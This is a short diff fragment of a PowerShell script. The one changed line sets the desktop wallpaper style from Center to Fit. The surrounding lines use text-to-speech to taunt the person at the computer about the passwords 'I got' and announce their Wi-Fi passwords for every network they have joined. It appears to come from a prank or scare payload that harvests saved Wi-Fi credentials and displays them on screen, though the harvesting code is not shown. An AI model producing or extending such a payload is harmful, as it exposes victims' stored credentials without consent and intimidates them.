@@ -398,7 +398,7 @@ if (!$Networks) { Write-Host "variable is null"
 
 
 	$s.Speak("wanna see something really cool?")
-	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
+	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Fit
 	$s.Speak("Look at all your other passswords I got..")
 	Start-Sleep -Seconds 1
 	$s.Speak("These are the wifi passwords for every network you've ever connected to!")
